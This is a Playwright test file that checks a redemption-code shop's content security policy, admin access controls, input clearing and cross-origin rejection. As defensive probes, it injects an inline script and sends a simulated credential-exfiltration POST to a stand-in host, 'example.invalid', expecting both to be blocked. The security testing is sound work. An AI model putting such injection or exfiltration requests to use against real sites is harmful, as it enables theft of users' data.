import { openAdminPage } from './admin-helpers'
import { expect, test } from '@playwright/test'
const origin = process.env.E2E_BASE_URL || 'http://localhost:3000'

test('CSP permits the application and blocks untrusted inline code and external requests', async ({
  page,
  request,
}) => {
  // Inject before HTML parsing. DevTools Runtime.evaluate can bypass inline
  // script checks and is not a faithful simulation of reflected HTML injection.
  await page.route('**/checkout?product=plus', async (route) => {
    const response = await route.fetch()
    const html = (await response.text()).replace(
      '</head>',
      '<script>window.__cspProbe = true</script></head>',
    )
    await route.fulfill({ response, body: html })
  })
  const response = await page.goto('/checkout?product=plus')
  expect(response?.headers()['content-security-policy']).toContain("'strict-dynamic'")
  await expect(page.getByLabel('账号会话信息', { exact: true })).toBeVisible()
  await expect(
    page.locator('script[src*="googletagmanager"],script[src*="google-analytics"]'),
  ).toHaveCount(0)
  const result = await page.evaluate(async () => {
    let externalBlocked = false
    try {
      await fetch('https://example.invalid/credential-probe', {
        method: 'POST',
        body: 'synthetic-only',
      })
    } catch {
      externalBlocked = true
    }
    return {
      executed: (window as Window & { __cspProbe?: boolean }).__cspProbe === true,
      externalBlocked,
    }
  })
  expect(result).toEqual({ executed: false, externalBlocked: true })
  const forbidden = await request.get('/api/admin')
  expect(forbidden.status()).toBe(401)
  expect(forbidden.headers()['cache-control']).toContain('no-store')
  expect(forbidden.headers()['referrer-policy']).toBe('no-referrer')
})

test('inventory inputs are cleared on cancel and save, and card values never appear in admin responses', async ({
  page,
}) => {
  await page.goto('/')
  await page
    .getByRole('button', { name: /登录 \/ 注册/ })
    .first()
    .click()
  await page.getByPlaceholder('you@example.com').fill('admin@example.com')
  await page.getByRole('button', { name: '获取验证码', exact: true }).click()
  const alert = page.getByText(/本地演示验证码：/)
  await expect(alert).toBeVisible()
  await page
    .getByPlaceholder('6 位验证码', { exact: true })
    .fill((await alert.textContent())!.match(/\d{6}/)![0])
  await page
    .getByRole('dialog')
    .getByRole('button', { name: /登录 \/ 注册/ })
    .click()
  await expect(page.getByRole('dialog')).toBeHidden()
  await page.goto('/admin')
  await openAdminPage(page, '商品管理')
  await page.getByRole('button', { name: '导入兑换库存' }).click()
  const dialog = page.getByRole('dialog')
  const input = dialog.getByLabel('兑换码（每行一个）')
  await input.fill('synthetic-discarded-card')
  await dialog.locator('.ant-modal-close').click()
  await page.getByRole('button', { name: '导入兑换库存' }).click()
  await expect(input).toHaveValue('')
  await expect(input).toHaveAttribute('spellcheck', 'false')
  const productSelect = dialog.getByRole('combobox', { name: '绑定商品' })
  await productSelect.click()
  await productSelect.press('Home')
  await productSelect.press('ArrowDown')
  await productSelect.press('Enter')
  await expect(productSelect).toHaveAttribute('aria-expanded', 'false')
  await expect(dialog).toContainText('ChatGPT Plus')
  const card = `synthetic-import-${Date.now()}`
  await dialog.getByLabel('批次名称').fill('安全验证批次')
  await input.fill(card)
  await dialog.getByRole('button', { name: '加密保存库存' }).click()
  await expect(dialog).toBeHidden()
  await page.getByRole('button', { name: '导入兑换库存' }).click()
  await expect(input).toHaveValue('')
  const admin = await page.request.get('/api/admin')
  expect(admin.status()).toBe(200)
  expect(await admin.text()).not.toContain(card)
  const crossOrigin = await page.request.post('/api/admin/inventory', {
    headers: { Origin: 'https://outside.invalid', 'X-GetGPT-Request': '1' },
    data: { productId: 'plus', codes: ['synthetic-blocked-card'] },
  })
  expect(crossOrigin.status()).toBe(403)
  expect(crossOrigin.headers()['cache-control']).toContain('no-store')
  expect(
    (
      await page.request.post('/api/admin/inventory', {
        headers: { Origin: origin, 'X-GetGPT-Request': '1' },
        data: { productId: 'plus', codes: ['short'] },
      })
    ).status(),
  ).toBe(400)
})
